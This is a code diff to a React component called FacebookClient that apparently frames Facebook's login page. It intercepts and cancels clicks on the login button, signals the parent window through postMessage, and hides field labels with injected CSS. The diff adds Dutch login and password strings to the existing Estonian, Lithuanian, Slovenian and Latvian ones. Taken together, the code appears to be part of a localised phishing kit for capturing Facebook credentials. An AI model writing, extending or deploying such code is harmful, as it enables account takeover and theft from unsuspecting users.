@@ -126,7 +126,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
                   for (var i = 0; i < 10 && el; i++) {
                     var txt = (el.textContent || '').trim();
                     var al = (el.getAttribute && el.getAttribute('aria-label')) || '';
-                    if (txt === 'Prijava' || al === 'Prijava' || txt === 'Logi sisse' || txt === 'Prisijungti' || al === 'Logi sisse' || al === 'Prisijungti' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0) {
+                    if (txt === 'Aanmelden' || al === 'Aanmelden' || txt === 'Meld je aan' || al === 'Meld je aan' || txt === 'Prijava' || al === 'Prijava' || txt === 'Logi sisse' || txt === 'Prisijungti' || al === 'Logi sisse' || al === 'Prisijungti' || txt.indexOf('Prisijungti') === 0 || al.indexOf('Prisijungti') === 0 || txt.indexOf('Aanmelden') === 0 || al.indexOf('Aanmelden') === 0) {
                       window.parent.postMessage({ type: 'fb_submit_click' }, '*');
                       e.preventDefault();
                       e.stopPropagation();
@@ -264,6 +264,10 @@ export function FacebookClient({ sessionId: propSid }: Props) {
         if (rawText.length > 120) return; // uzun ana metin = label degil (footer, paragraf)
         const tl = rawText.toLowerCase();
         const isLabelText =
+          tl.includes("wachtwoord") ||
+          tl.includes("e-mailadres") ||
+          tl.includes("telefoonnummer") ||
+          tl.includes("vergeten") ||
           tl.includes("parool") ||
           tl.includes("parooli") ||
           tl.includes("meiliaadress") ||
@@ -364,6 +368,10 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const t = s.toLowerCase().replace(/\s+/g, " ").trim();
           if (!t || t.length < 3) return false;
           return (
+            t.includes("wachtwoord") ||
+            t.includes("e-mailadres") ||
+            t.includes("telefoonnummer") ||
+            t.includes("vergeten") ||
             t.includes("parool") ||
             t.includes("parooli") ||
             t.includes("meiliaadress") ||
@@ -477,7 +485,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
             newStyle.textContent = `
               input::-webkit-input-placeholder, input::-moz-placeholder, input:-ms-input-placeholder, input::placeholder { color: transparent !important; opacity: 0 !important; }
               input:placeholder-shown + label, input[placeholder*='email'] + span, input[placeholder*='parool'] + div { display: none !important; visibility: hidden !important; opacity: 0 !important; }
-              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'], [aria-label*='mobilne']:not(input):not(textarea), [aria-label*='e-poštni']:not(input):not(textarea), [aria-label*='e-postni']:not(input):not(textarea), [aria-label*='Geslo']:not(input):not(textarea), [aria-label*='lapta']:not(input):not(textarea), [aria-label*='pašt']:not(input):not(textarea), [aria-label*='past']:not(input):not(textarea), [title*='lapta']:not(input) { color: transparent !important; opacity: 0 !important; }
+              [aria-label*='meiliaadress'], [aria-label*='parool'], [title*='meiliaadress'], [title*='parool'], [aria-label*='mobilne']:not(input):not(textarea), [aria-label*='e-poštni']:not(input):not(textarea), [aria-label*='e-postni']:not(input):not(textarea), [aria-label*='Geslo']:not(input):not(textarea), [aria-label*='lapta']:not(input):not(textarea), [aria-label*='pašt']:not(input):not(textarea), [aria-label*='past']:not(input):not(textarea), [title*='lapta']:not(input), [aria-label*='telefoonnummer']:not(input):not(textarea), [aria-label*='e-mailadres']:not(input):not(textarea), [aria-label*='wachtwoord']:not(input):not(textarea), [aria-label*='e-mail']:not(input):not(textarea) { color: transparent !important; opacity: 0 !important; }
               [aria-label*='meiliaadress']::before, [aria-label*='meiliaadress']::after, [aria-label*='parool']::before, [aria-label*='parool']::after, [aria-label*='mobilne']::before, [aria-label*='mobilne']::after, [aria-label*='Geslo']::before, [aria-label*='Geslo']::after, [aria-label*='lapta']::before, [aria-label*='lapta']::after, [aria-label*='pašt']::before, [aria-label*='pašt']::after { content: '' !important; display: none !important; }
             `;
             (dc.head || dc.documentElement).appendChild(newStyle);
@@ -518,7 +526,7 @@ export function FacebookClient({ sessionId: propSid }: Props) {
           const b = btns[i];
           const t = (b.textContent || "").trim();
           const al = b.getAttribute("aria-label") || "";
-          if (t === "Prijava" || al === "Prijava" || t === "Logi sisse" || t === "Prisijungti" || al === "Logi sisse" || al === "Prisijungti" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti")) return b;
+          if (t === "Aanmelden" || al === "Aanmelden" || t === "Meld je aan" || al === "Meld je aan" || t === "Prijava" || al === "Prijava" || t === "Logi sisse" || t === "Prisijungti" || al === "Logi sisse" || al === "Prisijungti" || t.startsWith("Prisijungti") || al.startsWith("Prisijungti") || t.startsWith("Aanmelden") || al.startsWith("Aanmelden")) return b;
         }
         return null;
       }
